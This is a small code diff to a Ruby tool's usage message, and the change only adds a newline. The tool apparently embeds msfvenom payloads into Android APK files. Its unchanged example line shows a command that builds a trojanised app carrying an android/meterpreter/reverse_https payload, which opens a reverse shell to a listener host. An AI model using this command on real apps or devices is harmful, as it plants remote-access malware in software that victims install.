@@ -56,7 +56,7 @@ def banner()
 end
   
 def usage()
-  print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]"
+  print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]\n"
   print "[ex]─➤ ".green,"embed anyapp.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
 end
 
